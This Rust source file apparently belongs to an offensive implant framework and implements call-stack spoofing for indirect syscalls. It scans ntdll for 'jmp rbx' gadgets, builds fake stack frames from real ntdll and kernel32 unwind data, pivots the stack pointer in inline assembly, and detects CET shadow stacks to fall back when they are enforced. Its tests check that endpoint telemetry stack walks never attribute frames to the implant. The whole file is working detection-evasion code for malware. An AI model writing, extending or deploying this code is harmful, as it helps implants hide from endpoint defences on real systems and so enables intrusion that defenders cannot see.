//! Call-stack/return-address spoofing (ABR-T010) for indirect syscalls.
//!
//! A plain indirect dispatch leaks frame 1 of any telemetry stack walk:
//! the `syscall; ret` gadget's unwinder pops [rsp] — the return address
//! into our dispatcher, inside the implant image. This module replaces
//! that with a synthetic stack: the dispatcher pivots rsp to a caller
//! stack buffer laid out so the walk replays REAL ntdll/kernel32 unwind
//! programs over fake frames (frame sizes computed at runtime from each
//! anchor's own UNWIND_INFO) and bottoms out at the canonical thread
//! anchors (`BaseThreadInitThunk`, `RtlUserThreadStart`). No frame ever
//! attributes to the implant image.
//!
//! Execution returns through a `jmp rbx` gadget inside ntdll ([rsp] at
//! syscall time), with the continuation stashed in rbx — so the value the
//! walker sees as frame 1 is a real ntdll address. HSP-aware: under an
//! enforced user-mode shadow stack (CET) the ret-based return would
//! fault, so [`chain`] yields None and callers fall back to the plain
//! indirect dispatcher. Concept adapted from the Morgana prototype; the
//! frame math, gadget selection and harness are Abraham-specific.

use std::ffi::c_void;

use super::syscalls::{self, Syscall};
use super::unwind;

/// Slots of the synthetic stack the kernel READS for stack-passed
/// syscall arguments at syscall time: a5 at [rsp+0x28] (slot 5), a6 at
/// [rsp+0x30] (slot 6). Synthetic return addresses must never land in
/// these slots; every other slot is invisible to the kernel (the shadow
/// space and the "saved registers" of whatever frame the walker is
/// replaying — the walker only does rsp arithmetic there).
const ARG_SLOTS: [usize; 2] = [5, 6];

/// Same zone extended to ten-argument dispatches: a7..a10 occupy slots
/// 7..10 ([rsp+0x38..0x58]).
const ARG_SLOTS10: [usize; 6] = [5, 6, 7, 8, 9, 10];

const TEMPLATE_SLOTS: usize = 24;

#[allow(non_snake_case)]
extern "system" {
    fn GetModuleHandleW(name: *const u16) -> *mut c_void;
}

fn module_base(name: &str) -> Option<usize> {
    let wide: Vec<u16> = name.encode_utf16().chain(std::iter::once(0)).collect();
    let handle = unsafe { GetModuleHandleW(wide.as_ptr()) };
    (!handle.is_null()).then_some(handle as usize)
}

/// Current image base (the implant/test binary) — the image a spoofed
/// chain must never expose. Measurement harness only.
#[cfg(test)]
pub fn current_image_base() -> Option<usize> {
    let handle = unsafe { GetModuleHandleW(std::ptr::null()) };
    (!handle.is_null()).then_some(handle as usize)
}

unsafe fn read_u32(ptr: *const u8) -> u32 {
    u32::from_le_bytes([
        std::ptr::read_volatile(ptr),
        std::ptr::read_volatile(ptr.add(1)),
        std::ptr::read_volatile(ptr.add(2)),
        std::ptr::read_volatile(ptr.add(3)),
    ])
}

/// SizeOfImage from the mapped PE at `base`.
unsafe fn image_size(base: usize) -> Option<usize> {
    unsafe {
        let dos = base as *const u8;
        if std::ptr::read_volatile(dos) != b'M' || std::ptr::read_volatile(dos.add(1)) != b'Z' {
            return None;
        }
        let pe = base + read_u32(dos.add(0x3C)) as usize;
        if read_u32(pe as *const u8) != 0x0000_4550 {
            return None;
        }
        let optional_header = pe + 24; // PE signature + file header
        Some(read_u32((optional_header + 0x38) as *const u8) as usize)
    }
}

/// A mid-function return address inside `export`, plus that function's
/// frame adjust from its own UNWIND_INFO — the walker replays the real
/// program, so the next synthetic frame must sit exactly one full frame
/// above this address.
struct Anchor {
    site: usize,
    adjust: usize,
}

fn anchor(module: &str, export: &str) -> Option<Anchor> {
    unsafe {
        let addr = syscalls::export_address(module, export)?;
        let (image, entry) = unwind::lookup(addr)?;
        let (adjust, prolog) = unwind::frame_adjust(image, entry)?;
        let entry = entry as *const u8;
        let begin = read_u32(entry) as usize;
        let end = read_u32(entry.add(4)) as usize;
        // Just past the prolog: a plausible post-call site inside the
        // function's own range (walkers only consult its metadata).
        let site = image + begin + prolog as usize + 1;
        (site < image + end).then_some(Anchor { site, adjust })
    }
}

/// Scans ntdll for `jmp rbx` (FF E3) gadgets whose containing function
/// has provable unwind arithmetic and the gadget past the prolog.
/// Collects up to `candidates.len()` — tiny leaf thunks (frame adjust 0)
/// are fine: with the walker popping straight through them, synthetic
/// frames land in the shadow space or inside the next anchor's frame,
/// and only slots 5/6 are off-limits (see [`ARG_SLOTS`]).
unsafe fn scan_return_trampolines(ntdll: usize, candidates: &mut Vec<(usize, usize)>) {
    unsafe {
        let Some(size) = image_size(ntdll) else {
            return;
        };
        let mut off = 0x1000usize;
        while off + 1 < size && candidates.len() < 16 {
            let p = (ntdll + off) as *const u8;
            if std::ptr::read_volatile(p) == 0xFF && std::ptr::read_volatile(p.add(1)) == 0xE3 {
                let pc = ntdll + off;
                if let Some((image, entry)) = unwind::lookup(pc) {
                    if image == ntdll {
                        if let Some((adjust, prolog)) = unwind::frame_adjust(ntdll, entry) {
                            let entry = entry as *const u8;
                            let begin = read_u32(entry) as usize;
                            let end = read_u32(entry.add(4)) as usize;
                            if off > begin + prolog as usize && off < end {
                                candidates.push((pc, adjust));
                            }
                        }
                    }
                }
            }
            off += 1;
        }
    }
}

/// The synthetic stacks for this process. Slot 0 is the value the syscall
/// gadget's `ret` pops ([rsp] at syscall time, inside the walker's view);
/// argument slots are patched per call by the `prepare*` methods.
/// `template10` is None when no big-frame anchor qualifies to clear the
/// ten-argument zone — ten-argument callers then stay on the plain
/// dispatcher.
pub struct SpoofChain {
    template6: [u64; TEMPLATE_SLOTS],
    template10: Option<[u64; TEMPLATE_SLOTS]>,
}

impl SpoofChain {
    /// The ntdll `jmp rbx` gadget serving as [rsp] at syscall time.
    /// Measurement harness only.
    #[cfg(test)]
    pub fn trampoline(&self) -> usize {
        self.template6[0] as usize
    }

    /// Copies the six-argument template into `out` and patches the
    /// stack-passed arguments a5/a6 (slots 5/6).
    pub(crate) fn prepare6(&self, out: &mut [u64; TEMPLATE_SLOTS], a5: usize, a6: usize) {
        *out = self.template6;
        out[5] = a5 as u64;
        out[6] = a6 as u64;
    }

    /// Copies the ten-argument template into `out` and patches a5..a10
    /// (slots 5..10). False when no ten-argument layout exists.
    pub(crate) fn prepare10(&self, out: &mut [u64; TEMPLATE_SLOTS], args: [usize; 6]) -> bool {
        let Some(template) = self.template10 else {
            return false;
        };
        *out = template;
        for (slot, value) in (5..=10).zip(args) {
            out[slot] = value as u64;
        }
        true
    }

    /// The six-argument template verbatim, for parking uses that place no
    /// stack arguments at all (dormant-thread waits): slot 0 is the
    /// ntdll trampoline a walker pops first, slots 1..4 the shadow space,
    /// and the anchor chain follows. ABR-T013 stages the copy so a
    /// suspended dormant thread replays a system-only call chain.
    #[allow(dead_code)]
    pub(crate) fn park_template(&self) -> [u64; TEMPLATE_SLOTS] {
        self.template6
    }
}

static CHAIN: std::sync::OnceLock<Option<SpoofChain>> = std::sync::OnceLock::new();

/// The process's synthetic chain, built once. None when it cannot be
/// built safely — no qualifying trampoline or unparsable anchors — or
/// when a user-mode shadow stack is enforced (HSP/CET: the ret-based
/// return would fault, so callers fall back to the plain dispatcher).
pub fn chain() -> Option<&'static SpoofChain> {
    CHAIN.get_or_init(build).as_ref()
}

/// Scans ntdll's export table (ordinal order) for the first function
/// whose frame adjust clears the ten-argument zone: after the leaf
/// trampoline puts an anchor at slot 1, an adjust in [0x50, 0x78] places
/// that function's return address — the next synthetic frame — at slots
/// 12..15, past every kernel-read argument slot, and still leaves room
/// for the thread-thunk anchor and the sentinel.
unsafe fn scan_big_anchor(ntdll: usize) -> Option<Anchor> {
    unsafe {
        let dos = ntdll as *const u8;
        let pe = ntdll + read_u32(dos.add(0x3C)) as usize;
        let optional = pe + 24;
        let dir_rva = read_u32((optional + 0x70) as *const u8) as usize;
        let dir_size = read_u32((optional + 0x74) as *const u8) as usize;
        if dir_rva == 0 {
            return None;
        }
        let export = (ntdll + dir_rva) as *const u8;
        let functions = read_u32(export.add(0x1C)) as usize;
        let count = read_u32(export.add(0x14)) as usize;
        for index in 0..count {
            let rva = read_u32((ntdll + functions + 4 * index) as *const u8) as usize;
            // Skip empty slots and forwarders (RVA inside the export dir).
            if rva == 0 || (rva >= dir_rva && rva < dir_rva + dir_size) {
                continue;
            }
            let addr = ntdll + rva;
            let Some((image, entry)) = unwind::lookup(addr) else {
                continue;
            };
            if image != ntdll {
                continue;
            }
            let Some((adjust, prolog)) = unwind::frame_adjust(ntdll, entry) else {
                continue;
            };
            if !(0x50..=0x78).contains(&adjust) {
                continue;
            }
            let entry = entry as *const u8;
            let begin = read_u32(entry) as usize;
            let end = read_u32(entry.add(4)) as usize;
            let site = ntdll + begin + prolog as usize + 1;
            if site < ntdll + end {
                return Some(Anchor { site, adjust });
            }
        }
    }
    None
}

fn build() -> Option<SpoofChain> {
    if user_shadow_stack_enabled() == Some(true) {
        return None;
    }
    unsafe {
        let ntdll = module_base("ntdll.dll")?;
        let mut candidates = Vec::new();
        scan_return_trampolines(ntdll, &mut candidates);
        // kernel32's thread thunk is the load-bearing anchor; the ntdll
        // thread-start anchor is best-effort (its unwind program is not
        // parsable on every build — on 26200 it is not).
        let primary = anchor("kernel32.dll", "BaseThreadInitThunk")?;
        let bottom = anchor("ntdll.dll", "RtlUserThreadStart");
        for (trampoline, trampoline_adjust) in candidates {
            // Walk math from the syscall moment (rsp = S): the Zw stub is
            // a leaf, so the walker pops [S] (the trampoline) and then
            // replays the trampoline function's real program from
            // rsp = S+8 — its return address, the first synthetic frame,
            // sits at S + 8 + trampoline_adjust. Each subsequent anchor
            // consumes 8 (its return slot) + its own frame adjust. A
            // layout is valid when no frame lands in the kernel-read
            // argument slots and everything fits the template.
            let anchors = [Some(&primary), bottom.as_ref()];
            let mut cursor = (8 + trampoline_adjust) / 8;
            let mut template6 = [0u64; TEMPLATE_SLOTS];
            template6[0] = trampoline as u64;
            let mut valid = true;
            for anchor in anchors.into_iter().flatten() {
                if ARG_SLOTS.contains(&cursor) || cursor >= TEMPLATE_SLOTS {
                    valid = false;
                    break;
                }
                template6[cursor] = anchor.site as u64;
                cursor += (8 + anchor.adjust) / 8;
            }
            if !valid {
                continue;
            }
            // Ten-argument layout on the same trampoline: the leaf puts
            // the big anchor at slot 1 (clear of slots 5..10), whose
            // 0x50..0x78 frame jumps the cursor past the whole argument
            // zone; the thread thunk follows and the sentinel stays zero.
            let mut template10 = None;
            if let Some(big) = scan_big_anchor(ntdll) {
                let thunk_slot = 2 + big.adjust / 8;
                if !ARG_SLOTS10.contains(&thunk_slot) && thunk_slot + 7 <= TEMPLATE_SLOTS {
                    let mut template = [0u64; TEMPLATE_SLOTS];
                    template[0] = trampoline as u64;
                    template[1] = big.site as u64;
                    template[thunk_slot] = primary.site as u64;
                    template10 = Some(template);
                }
            }
            // The slot past the last anchor stays zero: the walker reads
            // it as the final return address and terminates on the
            // invalid pc.
            return Some(SpoofChain {
                template6,
                template10,
            });
        }
    }
    None
}

/// The pivot common to every spoofed dispatch: rsp moves to the prepared
/// synthetic stack, the ntdll `syscall; ret` gadget runs with [rsp]
/// holding the trampoline (a real ntdll address), and execution returns
/// through the trampoline's `jmp rbx` with the continuation stashed in
/// rbx. The caller's real frame is preserved in rbp across the pivot.
///
/// # Safety
///
/// `ssn`/`gadget` must come from a resolved [`Syscall`]; `fake` must hold
/// a prepared template whose argument slots match the syscall's stack
/// arguments.
#[inline(never)]
unsafe fn pivot_dispatch(
    fake_ptr: *mut u64,
    ssn: u32,
    gadget: usize,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
) -> isize {
    let status;
    unsafe {
        core::arch::asm!(
            "push rbp",
            "mov rbp, rsp",
            "push rbx",
            "lea rbx, [rip + 2f]",
            "mov rsp, {fake}",
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "jmp r11",
            "2:",
            "lea rsp, [rbp - 8]",
            "pop rbx",
            "pop rbp",
            ssn = in(reg) ssn,
            in("r11") gadget,
            fake = in(reg) fake_ptr,
            in("rcx") a1,
            in("rdx") a2,
            in("r8") a3,
            in("r9") a4,
            lateout("rax") status,
            out("r10") _,
            // rbx holds the continuation between the pivot and the
            // trampoline's `jmp rbx`, but the block pushes and pops it
            // around that window — the caller-visible value is restored,
            // so no operand declaration is needed (rustc reserves rbx as
            // an operand class anyway).
        );
    }
    status
}

/// Spoofed six-argument indirect dispatch. None when the chain is
/// unavailable (HSP or build constraints) — callers fall back to the
/// plain dispatcher.
///
/// # Safety
///
/// `call` must be a resolved [`Syscall`] and the arguments must match
/// that syscall's signature.
#[inline(never)]
pub unsafe fn spoof6(
    call: Syscall,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
) -> Option<isize> {
    let chain = chain()?;
    let mut fake = [0u64; TEMPLATE_SLOTS];
    chain.prepare6(&mut fake, a5, a6);
    Some(unsafe { pivot_dispatch(fake.as_mut_ptr(), call.ssn, call.gadget, a1, a2, a3, a4) })
}

/// Spoofed ten-argument indirect dispatch (NtMapViewOfSection class).
/// None when the chain or its ten-argument layout is unavailable.
///
/// # Safety
///
/// Same contract as [`spoof6`]; all ten slots must match the invoked
/// syscall's signature.
#[inline(never)]
#[allow(clippy::too_many_arguments)]
pub unsafe fn spoof10(
    call: Syscall,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
    a7: usize,
    a8: usize,
    a9: usize,
    a10: usize,
) -> Option<isize> {
    let chain = chain()?;
    let mut fake = [0u64; TEMPLATE_SLOTS];
    if !chain.prepare10(&mut fake, [a5, a6, a7, a8, a9, a10]) {
        return None;
    }
    Some(unsafe { pivot_dispatch(fake.as_mut_ptr(), call.ssn, call.gadget, a1, a2, a3, a4) })
}

/// PROCESS_MITIGATION_POLICY enum value for the user shadow stack (CET)
/// policy. Adjacent indices matter: 16 is redirection trust, 18 is the
/// SEH-overwrite policy — on Windows 11 25H2 SEHO reads as enabled by
/// default and a wrong index turns the HSP probe into a lie (found the
/// hard way on build 26200).
const PROCESS_USER_SHADOW_STACK_POLICY: u32 = 15;

/// Probes the user-mode shadow stack (CET) mitigation for this process.
/// None when the mitigation API is unavailable; Some(true) means ret-
/// based returns are validated against a shadow stack and would fault on
/// the synthetic chain — the HSP-aware degradation point.
pub fn user_shadow_stack_enabled() -> Option<bool> {
    unsafe {
        let get_policy: unsafe extern "system" fn(*mut c_void, u32, *mut c_void, usize) -> i32 =
            std::mem::transmute(syscalls::export_address(
                "kernel32.dll",
                "GetProcessMitigationPolicy",
            )?);
        let current_process: unsafe extern "system" fn() -> *mut c_void = std::mem::transmute(
            syscalls::export_address("kernel32.dll", "GetCurrentProcess")?,
        );
        let mut policy = 0u32;
        let ok = get_policy(
            current_process(),
            PROCESS_USER_SHADOW_STACK_POLICY,
            std::ptr::addr_of_mut!(policy).cast(),
            std::mem::size_of::<u32>(),
        );
        (ok == 1).then_some(policy & 1 != 0)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn hsp_probe_definite() {
        // On build 26200 the policy query succeeds for the own process;
        // host default is disabled (Some(false)) — recorded in the lab
        // report. Either value is valid; None would mean API loss.
        let probe = user_shadow_stack_enabled();
        assert!(probe.is_some(), "mitigation policy query failed");
        eprintln!("user shadow stack enabled: {probe:?}");
    }

    #[test]
    fn template_keeps_argument_zone_clear() {
        let Some(chain) = chain() else {
            eprintln!("spoof chain unavailable here (HSP or anchors) — skipping");
            return;
        };
        assert_ne!(chain.trampoline(), 0, "missing return trampoline");
        for slot in ARG_SLOTS {
            assert_eq!(
                chain.template6[slot], 0,
                "kernel-read argument slot {slot} occupied by a frame"
            );
        }
        // The ten-argument layout (when it exists) must clear slots 5..10.
        if let Some(template) = chain.template10 {
            assert_ne!(template[1], 0, "missing big-frame anchor");
            for slot in ARG_SLOTS10 {
                assert_eq!(
                    template[slot], 0,
                    "kernel-read argument slot {slot} occupied by a frame"
                );
            }
        }
    }

    /// The measurement this technique exists for: replay the walker over
    /// the synthetic stack exactly as it would run at syscall time —
    /// every frame must attribute to ntdll or kernel32, none to this
    /// image, and the chain must reach the kernel32 anchor.
    #[test]
    fn walker_sees_only_system_frames_on_spoofed_stack() {
        let Some(chain) = chain() else {
            eprintln!("spoof chain unavailable here (HSP or anchors) — skipping");
            return;
        };
        unsafe {
            let call = syscalls::resolve("NtYieldExecution").expect("NtYieldExecution");
            let mut fake = [0u64; TEMPLATE_SLOTS];
            chain.prepare6(&mut fake, 0x1111, 0x2222);
            walk_and_assert_system_only(call.gadget, &mut fake);
        }
    }

    /// Same measurement for the ten-argument layout (the KnownDlls
    /// bootstrap's NtMapViewOfSection shape), with every kernel-read
    /// argument slot carrying a live-looking pattern.
    #[test]
    fn walker_sees_only_system_frames_on_spoofed10_stack() {
        let Some(chain) = chain() else {
            eprintln!("spoof chain unavailable here (HSP or anchors) — skipping");
            return;
        };
        unsafe {
            let call = syscalls::resolve("NtYieldExecution").expect("NtYieldExecution");
            let mut fake = [0u64; TEMPLATE_SLOTS];
            if !chain.prepare10(&mut fake, [0x1111, 0x2222, 0x3333, 0x4444, 0x5555, 0x6666]) {
                eprintln!("no ten-argument layout on this build — skipping");
                return;
            }
            walk_and_assert_system_only(call.gadget, &mut fake);
        }
    }

    /// Shared walker replay: rip = the syscall instruction, rsp = the
    /// synthetic stack — the exact context a telemetry walk sees. Every
    /// frame must attribute to ntdll or kernel32, none to this image,
    /// and the chain must reach the kernel32 anchor.
    unsafe fn walk_and_assert_system_only(rip: usize, fake: &mut [u64; TEMPLATE_SLOTS]) {
        unsafe {
            let mut context = unwind::context_with(rip, fake.as_ptr() as usize);
            let ntdll = module_base("ntdll.dll").unwrap();
            let kernel32 = module_base("kernel32.dll").unwrap();
            let exe = current_image_base().unwrap();
            let mut images = Vec::new();
            for _ in 0..6 {
                let Some((image, entry)) = unwind::lookup(context.rip as usize) else {
                    break;
                };
                images.push(image);
                unwind::virtual_unwind(entry, image, &mut context);
                if context.rip == 0 {
                    break;
                }
            }
            assert!(images.len() >= 3, "chain too short: {images:#x?}");
            assert!(
                images.contains(&kernel32),
                "chain lacks the kernel32 anchor"
            );
            for image in &images {
                assert!(
                    image == &ntdll || image == &kernel32,
                    "frame attributed to non-system image {image:#x}"
                );
            }
            assert!(
                !images.contains(&exe),
                "synthetic chain leaked this image's base"
            );
        }
    }

    /// Legitimate-software control: the SAME walker over a REAL thread of
    /// this process. Inner frames attribute to this image (the contrast
    /// the spoof removes) and the chain bottoms out at the canonical
    /// anchors — proving the synthetic chain mimics the real shape.
    #[test]
    fn real_thread_control_exposes_own_image_and_canonical_bottom() {
        let handle = std::thread::spawn(|| unsafe {
            let capture: unsafe extern "system" fn(*mut unwind::Context) = std::mem::transmute(
                syscalls::export_address("kernel32.dll", "RtlCaptureContext").unwrap(),
            );
            let mut context: unwind::Context = std::mem::zeroed();
            capture(&mut context);
            let mut images = Vec::new();
            for _ in 0..64 {
                let Some((image, entry)) = unwind::lookup(context.rip as usize) else {
                    break;
                };
                images.push(image);
                unwind::virtual_unwind(entry, image, &mut context);
                if context.rip == 0 {
                    break;
                }
            }
            images
        });
        let images = handle.join().expect("control thread panicked");
        let exe = current_image_base().unwrap();
        assert!(
            images.contains(&exe),
            "control walk lost its own image frames"
        );
        assert!(
            images.contains(&module_base("kernel32.dll").unwrap()),
            "control lacks the kernel32 anchor"
        );
        assert!(
            images.contains(&module_base("ntdll.dll").unwrap()),
            "control lacks the ntdll anchor"
        );
    }

    #[test]
    fn spoofed_syscall_executes() {
        if chain().is_none() {
            eprintln!("spoof chain unavailable here (HSP or anchors) — skipping");
            return;
        }
        unsafe {
            let call = syscalls::resolve("NtYieldExecution").expect("NtYieldExecution");
            let status = spoof6(call, 0, 0, 0, 0, 0, 0).expect("spoof6 dispatch");
            assert!(
                status == 0 || status == 0x4000_0024,
                "unexpected status {status:#x}"
            );
        }
    }

    /// The ten-argument dispatch executes and returns through the pivot.
    /// The argument-carrying proof lives in the syscalls tests: the real
    /// KnownDlls mapping (NtMapViewOfSection) runs through dispatch10
    /// once the bootstrap adopts it.
    #[test]
    fn spoofed10_dispatcher_executes() {
        if chain().and_then(|chain| chain.template10).is_none() {
            eprintln!("no ten-argument layout on this build — skipping");
            return;
        }
        unsafe {
            let call = syscalls::resolve("NtYieldExecution").expect("NtYieldExecution");
            let status = spoof10(call, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0).expect("spoof10 dispatch");
            assert!(
                status == 0 || status == 0x4000_0024,
                "unexpected status {status:#x}"
            );
        }
    }
}
